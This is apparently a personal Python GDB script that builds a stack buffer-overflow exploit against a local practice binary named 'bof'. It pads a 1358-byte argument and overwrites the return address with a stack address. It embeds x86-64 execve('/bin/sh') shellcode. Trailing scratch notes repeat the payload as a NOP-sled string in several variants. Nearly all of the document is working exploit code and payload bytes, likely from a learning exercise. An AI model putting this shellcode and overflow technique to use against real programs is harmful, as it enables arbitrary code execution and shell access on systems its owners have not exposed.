#!/usr/bin/python
import gdb

gdb.execute("file /home/chicken/bof")

arg = [0x41 for i in range(1358)]
# 7fffffffd990
arg[1352] = 0x90
arg[1353] = 0xd9
arg[1354] = 0xff
arg[1355] = 0xff
arg[1356] = 0xff
arg[1357] = 0x7f
# arg[1358] = 0x00
# arg[1359] = 0x00

sc = [0xeb,0x11,0x5f,0x48,0x31,0xc0,0x88,0x47,0x07,0xb0,0x3b,0x48,0x31,0xf6,0x48,0x31,0xd2,0x0f,0x05,0xe8,0xea,0xff,0xff,0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x41]

i = 0
while i < len(sc):
    arg[500 + i] = sc[i]
    i = i+1

# for c in arg:
#     print("0x%x"%(c))

print("set args " + "".join([chr(c) for c in arg]))

gdb.execute("set args " + "".join([chr(c) for c in arg]))

# gdb.execute("set args AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

gdb.execute("break *0x4005c2")
gdb.execute("break *0x4005ce")
gdb.execute("break *0x4005e5")

gdb.execute("run")

buf = gdb.execute('p/x $rax', to_string=True).strip().split()[2]
# buf = gdb.execute('p/x $rax', to_string=True)
print("the address of buf is " +  buf)

# sc = [0xeb,0x0e,0x5f,0x48,0x31,0xc0,0xb0,0x3b,0x48,0x31,0xf6,0x48,0x31,0xd2,0x0f,0x05,0xe8,0xed,0xff,0xff,0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00]

# i = 0

# while i < len(sc):
#     gdb.execute("set {char} (" + buf + " + " + str(i) + " ) = "  +str(sc[i]))
#     i = i+1
# while i < 1352:
#     gdb.execute("set {char} (" + buf + " + " + str(i) + " ) = 0x90")
#     i = i+1

# print(buf[12:14])
# print(buf[10:12])
# print(buf[8:10])
# print(buf[6:8])
# print(buf[4:6])
# print(buf[2:4])
    
# gdb.execute("set {char} (" + buf + " + 1352" + " ) = 0x" + buf[12:14])
# gdb.execute("set {char} (" + buf + " + 1353" + " ) = 0x" + buf[10:12])
# gdb.execute("set {char} (" + buf + " + 1354" + " ) = 0x" + buf[8:10])
# gdb.execute("set {char} (" + buf + " + 1355" + " ) = 0x" + buf[6:8])
# gdb.execute("set {char} (" + buf + " + 1356" + " ) = 0x" + buf[4:6])
# gdb.execute("set {char} (" + buf + " + 1357" + " ) = 0x" + buf[2:4])
# gdb.execute("set {char} (" + buf + " + 1358" + " ) = 0x00")
# gdb.execute("set {char} (" + buf + " + 1359" + " ) = 0x00")


#########################################
########## note ########################
## rax 0x7fffffffdac0


# "\xeb\x11\x5f\x48\x31\xc0\x88\x47\x07\xb0\x5c\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05\xe8\xea\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41"

chr(0xeb)+chr(0x11)+chr(0x5f)+chr(0x48)+chr(0x31)+chr(0xc0)+chr(0x88)+chr(0x47)+chr(0x07)+chr(0xb0)+chr(0x5c)+chr(0x3b)+chr(0x48)+chr(0x31)+chr(0xf6)+chr(0x48)+chr(0x31)+chr(0xd2)+chr(0x0f)+chr(0x05)+chr(0xe8)+chr(0xea)+chr(0xff)+chr(0xff)+chr(0xff)+chr(0x2f)+chr(0x62)+chr(0x69)+chr(0x6e)+chr(0x2f)+chr(0x73)+chr(0x68)+chr(0x41)



print(chr(0x90)*500 + chr(0xeb) + chr(0x11) + chr(0x5f) + chr(0x48) + chr(0x31) + chr(0xc0) + chr(0x88) + chr(0x47) + chr(0x07) + chr(0xb0) + chr(0x5c) + chr(0x3b) + chr(0x48) + chr(0x31) + chr(0xf6) + chr(0x48) + chr(0x31) + chr(0xd2) + chr(0x0f) + chr(0x05) + chr(0xe8) + chr(0xea) + chr(0xff) + chr(0xff) + chr(0xff) + chr(0x2f) + chr(0x62) + chr(0x69) + chr(0x6e) + chr(0x2f) + chr(0x73) + chr(0x68) + chr(0x41) + chr(0x90)*820 + chr(0xc0) + chr(0xd9) + chr(0xff) + chr(0xff) + chr(0xff)+ chr(0x7f)

"\xeb\x11\x5f\x48\x31\xc0\x88\x47\x07\xb0\x5c\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05\xe8\xea\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41".("\x90"*820)."\xc0\xd9\xff\xff\xff\x7f)"
